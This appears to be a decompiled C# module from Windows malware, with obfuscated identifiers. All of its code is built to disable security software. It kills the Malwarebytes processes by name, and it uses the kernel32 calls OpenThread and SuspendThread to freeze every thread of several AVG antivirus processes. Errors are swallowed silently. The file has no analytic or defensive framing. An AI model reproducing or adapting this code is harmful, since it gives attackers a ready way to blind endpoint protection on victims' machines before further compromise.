using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace SNDBgbsWAO;

internal sealed class KAGRipkiGgpEhyuth
{
	public enum vnzSSmNMgGcvvxAr
	{
		XvDOpMnihLT = 1,
		gkWCCNiSnBQcfb = 2,
		fAtPFVrTshLnfw = 8,
		juUtKEcXRob = 0x10,
		iAgRuwnDvfVQPIrWh = 0x20,
		SGanDfaMlIxf = 0x40,
		cQHiKWAykeoL = 0x80,
		oORItcihSHrin = 0x100,
		sWqikKYtdmJgy = 0x200
	}

	public static void sCGSmblztOkat()
	{
		Process[] processesByName = Process.GetProcessesByName("mbamgui");
		foreach (Process process in processesByName)
		{
			if (Operators.CompareString(process.MainWindowTitle.Trim(), "Malwarebytes Anti-Malware", false) == 0)
			{
				process.Kill();
			}
		}
		try
		{
			Process[] processesByName2 = Process.GetProcessesByName("mbamgui");
			Process[] array = processesByName2;
			foreach (Process process2 in array)
			{
				process2.Kill();
			}
		}
		catch (Exception)
		{
		}
		Process[] processesByName3 = Process.GetProcessesByName("mbam");
		foreach (Process process3 in processesByName3)
		{
			if (Operators.CompareString(process3.MainWindowTitle.Trim(), "Malwarebytes Anti-Malware", false) == 0)
			{
				process3.Kill();
			}
		}
		try
		{
			Process[] processesByName4 = Process.GetProcessesByName("mbam");
			Process[] array2 = processesByName4;
			foreach (Process process4 in array2)
			{
				process4.Kill();
			}
		}
		catch (Exception)
		{
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr OpenThread(vnzSSmNMgGcvvxAr vnzSSmNMgGcvvxAr_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern uint SuspendThread(IntPtr intptr_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr intptr_0);

	private static void FsIQwFuCvFGJ(Process process_0)
	{
		try
		{
			foreach (object thread in process_0.Threads)
			{
				ProcessThread processThread = (ProcessThread)thread;
				IntPtr intPtr = OpenThread(vnzSSmNMgGcvvxAr.gkWCCNiSnBQcfb, bool_0: false, checked((uint)processThread.Id));
				if (intPtr != IntPtr.Zero)
				{
					SuspendThread(intPtr);
					CloseHandle(intPtr);
				}
			}
		}
		finally
		{
		}
	}

	public static void ruLgTxLdhzFX()
	{
		Process[] processesByName = Process.GetProcessesByName("avgidsagent");
		Process[] processesByName2 = Process.GetProcessesByName("avgfws");
		Process[] processesByName3 = Process.GetProcessesByName("avgtray");
		Process[] processesByName4 = Process.GetProcessesByName("avgemcx");
		Process[] processesByName5 = Process.GetProcessesByName("avgwdsvc");
		Process[] processesByName6 = Process.GetProcessesByName("avgnsx");
		Process[] processesByName7 = Process.GetProcessesByName("avgcsrvx");
		Process[] processesByName8 = Process.GetProcessesByName("avgrsx");
		Process[] processesByName9 = Process.GetProcessesByName("ToolbarUpdater");
		try
		{
			FsIQwFuCvFGJ(processesByName[0]);
			FsIQwFuCvFGJ(processesByName2[0]);
			FsIQwFuCvFGJ(processesByName3[0]);
			FsIQwFuCvFGJ(processesByName4[0]);
			FsIQwFuCvFGJ(processesByName5[0]);
			FsIQwFuCvFGJ(processesByName6[0]);
			FsIQwFuCvFGJ(processesByName7[0]);
			FsIQwFuCvFGJ(processesByName8[0]);
			FsIQwFuCvFGJ(processesByName9[0]);
		}
		catch (Exception)
		{
		}
	}

	public static void rMXsmgVprps()
	{
		ruLgTxLdhzFX();
		sCGSmblztOkat();
	}
}
